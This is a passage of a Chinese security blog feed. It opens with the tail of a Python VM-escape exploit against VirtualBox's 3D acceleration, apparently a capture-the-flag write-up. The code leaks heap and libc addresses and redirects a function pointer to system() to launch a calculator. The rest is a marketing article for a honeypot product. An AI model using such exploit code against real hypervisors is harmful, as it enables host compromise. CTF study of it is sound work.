        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;#self.read(self.pConn ,0x200, canfail= True)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hgcm_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_FREE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked crVBoxHGCMFree @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vbox_puts_off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_puts_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_system_off&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked system @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/snap/bin/gnome-calculator&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hgcm_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#if raw_input(&#39;you want RIP control? [y/n] &#39;).startswith(&#39;y&#39;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#    p.rip(0xdeadbeef)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1690&quot; data-rawheight=&quot;894&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1690&quot; data-original=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1690&quot; data-rawheight=&quot;894&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1690&quot; data-original=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;其他相关链接&lt;/b&gt;&lt;/p&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//drive.google.com/file/d/1IuRvlqWiZp7UhGN4BPifRS-NTDk5xdrd/view%3Fusp%3Dsharing&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;题目附件&lt;/a&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//phoenhex.re/2018-07-27/better-slow-than-sorry&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Better slow than sorry - VirtualBox 3D acceleration considered harmful&lt;/a&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-03-11-58910752</guid>
<pubDate>Mon, 11 Mar 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>从概念到落地：“伪装者”产品的成熟之路</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-03-04-58232413.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/58232413&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8542c89d89e1c49bfe16abc6540c92be_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;“伪装者”比喻，对标网络安全领域的欺骗伪装技术，长年以来最最通俗的常规理解：蜜罐。&lt;/p&gt;&lt;p&gt; 这其实早已不是一个创新的概念，然而许久以来，在商用产品领域也仅仅多停留在“概念”阶段。今天，我们不提磨出耳茧的米特尼克和蜜罐的故事，落地的看看近几年欺骗伪装技术的演变之路，以及一款伪装型商用安全产品的成熟必经之路。&lt;/p&gt;&lt;p&gt;不得不佩服国际级咨询机构的嗅觉，2016年9月，Gartner的大佬分析师Lawrence Pingree发布了一篇名为《新兴技术分析：欺骗伪装技巧和技术创造了安全技术商机》（Emerging Technology Analysis: Deception Techniques and Technologies Create Security Technology Business Opportunities），详细阐述了欺骗伪装技术作为一个防守型战略在抵御攻击者时具备的优势。2018年的Gartner十大前沿技术的报告中，欺骗伪装技术的重要性又被再次提及。&lt;/p&gt;&lt;p&gt; 也不得不佩服长亭我司技术大佬的嗅觉，竟然如此无独有偶，早于报告发布3个月的2016年6月，发布了国内第一款基于欺骗伪装技术的内网威胁感知系统——谛听（D-Sensor）。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-934308991121d24c742734fe680d332d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;414&quot; data-rawheight=&quot;98&quot; class=&quot;content_image&quot; width=&quot;414&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-934308991121d24c742734fe680d332d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;414&quot; data-rawheight=&quot;98&quot; class=&quot;content_image lazy&quot; width=&quot;414&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-934308991121d24c742734fe680d332d_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;早在几年前，如果去问大部分的安全采购者，可能对基于这一概念的产品都是生疏的，或者说并不能意识到其价值所在。但其实，基于蜜罐探测的使用由来已早。国际范围来说，某些政府机构可能是使用最久最广的，甚至在一些军事对抗领域，对蜜罐探测技术都不陌生。然而提及商用级别的产品，却是近几年才开始受到关注。因此，做好欺骗伪装类安全产品的关键一步：如何使技术本身具备企业级的商用特征和操作功能？ &lt;/p&gt;&lt;p&gt;与国际上同类产品相似，谛听（D-Sensor）的设计初衷是帮助减缓攻击者的认知过程，干扰自动化工具，拖延攻击者行为。企业级的网络架构中，攻击者信息搜集的过程势必需要嗅探到网络端口、架构、应用、系统和数据等维度，而欺骗伪装技术可以微妙地破坏攻击者和攻击者使用的工具之间的信任感。因此，这是一款以防守和干扰为目的的一种技术产品，并不是具备攻击基因的产品。&lt;/p&gt;&lt;p&gt;规模越大的企业机构，对基于欺骗伪装技术的、先进的威胁探测和防御解决方案的需求应该是更强的。网络架构的复杂性+海量安全报警信息同时决定了，对欺骗伪装能够模拟的对象类型、仿真精细度、自动化程度有更高的要求。金融机构、医疗健康、政府、软件等垂直行业，更重视欺骗伪装技术在安全架构中的应用。而这些因素，是谛听（D-Sensor）在设计之初就开始考虑和逐步推进的方向。 &lt;/p&gt;&lt;p&gt;谛听（D-Sensor）上市近三年来，在与多类客户沟通交流的过程中，总结了使用欺骗伪装类产品产生的“三类担心”，并通过产品功能的不断更新和架构迭代使产品逐渐成熟，来消解客户的顾虑。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;担心一：误报&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;误报是很多安全产品会出现的问题，大型机构的安全运维人员一定都有过被误报淹没的感觉。因此，“伪装者”产品，高度逼真的欺骗伪装元素显得尤为重要。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-eb585f58faec4c360ad74ca292a1219e_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;92&quot; class=&quot;content_image&quot; width=&quot;415&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-eb585f58faec4c360ad74ca292a1219e_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;92&quot; class=&quot;content_image lazy&quot; width=&quot;415&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-eb585f58faec4c360ad74ca292a1219e_b.jpg&quot;&gt;&lt;figcaption&gt;伪装对象及伪装难度&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;一个“值得信任”的伪装，必须是使用了多层、多样、多维部署，交叉越精细，细节越逼真，才有可能有用、可信、可被理解。谛听（D-Sensor）在这一点上已经可以做到零误报，高度逼真的分布式蜜网，攻击者一旦尝试发送信息或建立初始连接，就一定会被察觉。&lt;/p&gt;&lt;h2&gt;支持多种探针系统&lt;/h2&gt;&lt;p&gt;企业用户的业务需求或方向不同，使之使用的服务器操作系统也不尽相同。谛听（D-Sensor）为满足多样用户的业务需求，支持 Windows 32位、Windows 64位、Linux 32位、Linux 64位四种探针的操作系统，覆盖了市面上主流的操作系统。&lt;/p&gt;&lt;h2&gt;捕获数据更加精准&lt;/h2&gt;&lt;p&gt;Web 类蜜罐升级优化实现更加精确的识别攻击类型，包括 SQL 注入、 XSS 攻击、SSRF等36种攻击类型，判断和记录入侵及探测行为。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1f64a66eef2d6bf07f38aa3ad5b53b0a_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;210&quot; data-rawheight=&quot;523&quot; class=&quot;content_image&quot; width=&quot;210&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1f64a66eef2d6bf07f38aa3ad5b53b0a_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;210&quot; data-rawheight=&quot;523&quot; class=&quot;content_image lazy&quot; width=&quot;210&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-1f64a66eef2d6bf07f38aa3ad5b53b0a_b.jpg&quot;&gt;&lt;figcaption&gt;谛听（D-Sensor）可识别的部分攻击列表&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;虚拟机蜜罐&lt;/h2&gt;&lt;p&gt;虚拟机作为蜜罐迷惑性更高，谛听（D-Sensor）引入基于虚拟化的沙箱技术，系统级别的沙箱，即构建虚拟机蜜罐。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-69269bba9ec6fd0e99021ecc80460937_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;455&quot; data-rawheight=&quot;228&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;455&quot; data-original=&quot;https://pic4.zhimg.com/v2-69269bba9ec6fd0e99021ecc80460937_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-69269bba9ec6fd0e99021ecc80460937_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;455&quot; data-rawheight=&quot;228&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;455&quot; data-original=&quot;https://pic4.zhimg.com/v2-69269bba9ec6fd0e99021ecc80460937_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-69269bba9ec6fd0e99021ecc80460937_b.jpg&quot;&gt;&lt;figcaption&gt;虚拟机蜜罐图解&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;担心二：欺骗伪装的可信度&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通俗来说，既“伪装者”的可信度，以及更重要的——会不会阻断业务？&lt;/p&gt;&lt;p&gt; 一个好的“伪装者”，会让攻击者相信他们眼睛看到的。因此，理解攻击者，是欺骗伪装类产品间产生区别的第二大要素，也是谛听（D-Sensor）在用户的网络环境中能有出色表现的原因。如：在规划和部署节点时，能否结合客户网络架构中的各类威胁信息和其他安全产品进行布局，从而平衡整个网络架构的安全生态？&lt;/p&gt;&lt;p&gt; Gartner在2015年提出的Deceptive-Response Kill Chain概念，系统的总结了攻击者路径和欺骗伪装类产品如何在各环节发挥作用。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d7ac6ff536995bfe5e35f7b29583fe4c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;216&quot; class=&quot;content_image&quot; width=&quot;400&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d7ac6ff536995bfe5e35f7b29583fe4c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;216&quot; class=&quot;content_image lazy&quot; width=&quot;400&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-d7ac6ff536995bfe5e35f7b29583fe4c_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;同类的逻辑思路可在谛听（D-Sensor）的部署结构和分析呈现维度中找到呼应。让攻击者入“陷阱网”而不自知，才是高质量的“伪装者”。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1b99e8a92167165c80021ade580744b3_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;410&quot; class=&quot;content_image&quot; width=&quot;400&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1b99e8a92167165c80021ade580744b3_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;410&quot; class=&quot;content_image lazy&quot; width=&quot;400&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-1b99e8a92167165c80021ade580744b3_b.jpg&quot;&gt;&lt;figcaption&gt;谛听（D-Sensor）部署结构&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;这些是长亭科技基于多年渗透测试服务的积累，以及在国际黑客大赛中实时更新的攻击者技能/技巧知识，融会贯通的赋能产品设计，从而更理解客户的需求。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;担心三：欺骗伪装产品的成熟度&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;一款成熟的“伪装者”产品才能对客户起到真实可用的作用。谛听（D-Sensor）作为国内最早发布的一款欺骗伪装类产品，目前已在市场历练近3年的时间，服务过公安、政府、银行、证券、互联网等一众行业用户，在实战中不断丰富提升，比如：&lt;/p&gt;&lt;h2&gt;基于角色的访问控制：多租户&lt;/h2&gt;&lt;p&gt;谛听（D-Sensor）的多租户技术实现了在多用户的环境下共用相同的系统或程序组件，并且仍可确保各用户间数据的隔离性。每个租户在共享资源的同时，还可将各自的探针日志、报告等信息分隔开来，大大减少了企业的开销，并且有效的降低了环境建置的成本。&lt;/p&gt;&lt;h2&gt;自定义查看攻击和探测数据&lt;/h2&gt;&lt;p&gt;随着企业用户多样性的提升，繁杂多元的攻击方式涌现，客户对产品的数据分析和留存功能也有了更精细化的要求。谛听（D-Sensor）对攻击和探测数据的总览支持自定义查看方式，使用者可根据自身需求选择查看某个时间段的总览数据来进行分析，数据的展示更是支持折线图、环形图等多种形式。&lt;/p&gt;&lt;h2&gt;灵活配置白名单&lt;/h2&gt;&lt;p&gt;传统安全产品的白名单配置只支持将单一的 IP 列入白名单，这样处理的弊端是：一旦企业内部有进行日常活动的访问情况，将会产生大量的日志数据，同时还会向告警接收邮箱、syslog 信息接收服务器发送大量的告警信息，显然这些信息无益于分析真正的攻击探测数据，还会与有价值的数据抢占内存与磁盘资源。&lt;/p&gt;&lt;p&gt;谛听（D-Sensor）支持将源 IP 和目标 IP 分别放入白名单，并实现了两方端口的自由组合。白名单活动的记录方式配置也更加灵活，发送告警邮件、发送 syslog、是否记录日志可进行多选的自由组合，企业在进行日常的业务活动时大大消除干扰信息。&lt;/p&gt;&lt;h2&gt;大型架构下稳定性增强&lt;/h2&gt;&lt;p&gt;当企业网络架构复杂，业务量巨大时，意味着需要部署分布式蜜网的结构也更加复杂，探针的数量也会相应较大，随之可能会造成系统不稳定等诸多问题。谛听（D-Sensor）的优势在于面对探针数量增多后系统稳定性，包括前台列表页面展示以及后台运行性能，对探针流量有着很强的承载能力。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;最佳实践案例&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;某上市证券公司&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;用户需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;某上市证券公司在规划网络安全防护体系过程中，决定采用网络欺骗技术来提升整体防护能力，改善攻防双方情报不对等的现状，结合第三方威胁情报、安全集中管理平台和网络防护设备，积极应对不同攻击者的挑战。&lt;/p&gt;&lt;p&gt;该用户下辖多个服务网点，拥有多个对外服务系统，用户计划在真实环境部署监测节点，识别恶意访问并将其引入布设好的蜜网环境中，实现混淆攻击者视线、保护真实资产、追踪攻击者源头的业务目标。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;解决方案&lt;/b&gt;&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c1e704f5a6135b9ee37e0f6b19748c34_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;326&quot; data-rawheight=&quot;162&quot; class=&quot;content_image&quot; width=&quot;326&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c1e704f5a6135b9ee37e0f6b19748c34_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;326&quot; data-rawheight=&quot;162&quot; class=&quot;content_image lazy&quot; width=&quot;326&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-c1e704f5a6135b9ee37e0f6b19748c34_b.jpg&quot;&gt;&lt;figcaption&gt;某证券公司谛听部署示意图&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;通过在多个交易互联区和网点办公区部署谛听监测节点，实现对用户全网的安全威胁感知，在不改变用户原有网络架构基础上，实现了对攻击威胁的实时预警。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;建设成效&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;该用户利用谛听捕获到多次内外部人员违规扫描行为，并在该单位定期组织的红蓝对抗中成功迷惑攻击方，为安全人员提供了实时的防护预警和安全情报。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;某高校信息中心&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;用户需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;某高校已建设较为完善的安全防护体系，并建设了集中的安全日志分析平台。该高校为理工类高校，时常有学生在校园网中嗅探、扫描信息资产，发生过若干起恶作剧攻击事件。该高校信息中心计划通过部署谛听系统，识别校园网内的攻击事件，并记录攻击源IP和MAC地址，找出相关人员并进行教育处理。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;解决方案&lt;/b&gt;&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0e7e486c934f9cc609918a24d5ebafb0_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;264&quot; data-rawheight=&quot;181&quot; class=&quot;content_image&quot; width=&quot;264&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0e7e486c934f9cc609918a24d5ebafb0_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;264&quot; data-rawheight=&quot;181&quot; class=&quot;content_image lazy&quot; width=&quot;264&quot; 